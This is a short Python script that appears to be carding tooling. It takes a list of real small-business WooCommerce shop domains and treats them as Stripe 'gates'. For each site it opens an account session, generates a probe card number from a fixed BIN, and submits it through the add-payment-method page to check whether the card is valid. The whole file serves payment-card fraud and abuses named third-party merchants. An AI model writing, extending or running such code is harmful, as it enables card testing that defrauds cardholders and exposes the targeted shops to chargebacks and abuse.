import asyncio, json, sys, os
sys.path.insert(0, os.path.abspath("."))
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
from curl_cffi.requests import AsyncSession
import gate_client as gc
import setup_gate

cands = [
    'taiwanaji.com', 'layers-of-learning.com', 'uktyretechnicians.co.uk',
    'thetrendywhippet.co.uk', 'cjdannemiller.com', 'cherryarts.org',
    'tinwoodestate.com', 'mudpenny.com', 'woolnyarn.com', 'thedronecoach.com',
    'knxtra.co.nz', 'nlrugs.com'
]

async def check(d):
    base = f"https://{d}"
    g = {"domain": d, "base_url": base, "reg_url": f"{base}/my-account/",
         "add_pm_url": f"{base}/my-account/add-payment-method/",
         "ajax_url": f"{base}/wp-admin/admin-ajax.php", "gate_type": "wc_stripe_upe"}
    gs = setup_gate.GateSession(g)
    try:
        ok, det = await asyncio.wait_for(gs.open(), timeout=12)
        print(f"{d:24} -> OPEN: {ok} | {str(det)[:60]}")
        if ok:
            c = gc.gen_probe_card("453927")
            card = f"{c['number']}|{c['mm']}|{c['yy']}|{c['cvc']}"
            res = await gs.check_card(card)
            print(f"   [+] CARD CHECK: {res}")
    except asyncio.TimeoutError:
        print(f"{d:24} -> TIMEOUT (12s)")
    except Exception as e:
        print(f"{d:24} -> EXC: {type(e).__name__}")

async def main():
    for c in cands:
        await check(c)

if __name__ == "__main__":
    asyncio.run(main())
